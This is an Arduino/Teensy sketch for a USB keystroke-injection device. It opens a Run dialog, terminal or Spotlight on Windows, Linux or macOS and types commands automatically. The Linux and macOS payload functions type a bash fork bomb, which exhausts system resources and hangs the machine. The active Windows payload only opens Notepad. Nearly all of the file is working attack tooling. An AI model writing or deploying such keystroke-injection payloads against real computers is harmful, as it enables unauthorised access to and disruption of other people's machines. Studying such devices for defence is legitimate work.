int ledPin = 11;
int windows = 2;

void setup(){
  delay(3000); // Inital delay
}

void loop(){
  // Start
  digitalWrite(ledPin, HIGH);

  // Exploit
  //LinuxPayload();
  WindowsPayload();

  // End
  digitalWrite(ledPin, LOW);
  delay(20000); // Long delay between runs
}

// Specific functions
void LinuxPayload(){
  LinuxCommandRun("xterm");
  Keyboard.print("ulimit -c unlimited");
  Keyboard.print(":(){ :|:& };:");
}

void WindowsPayload(){
  WindowsCommandRun("notepad.exe");
  Keyboard.print("\n");
  Keyboard.print("");
  Keyboard.print("");
  Keyboard.print("");
}

void ApplePayload(){
  AppleCommandRun("Terminal");
  Keyboard.print(":(){ :|:& };:");
}

// Utility functions
void WindowsCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_R);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void LinuxCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_ALT,KEY_F2);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void AppleCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_SPACE); // "apple" aka command key, space key -- open spotlight
  delay(1500);
  Keyboard.print("Terminal.app");
  delay(1000);

  KeyPress(KEY_ENTER);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void KeyPress(int SomeKey) {
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void KeyCombo(int ModKey,int SomeKey) {
  Keyboard.set_modifier(ModKey);
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

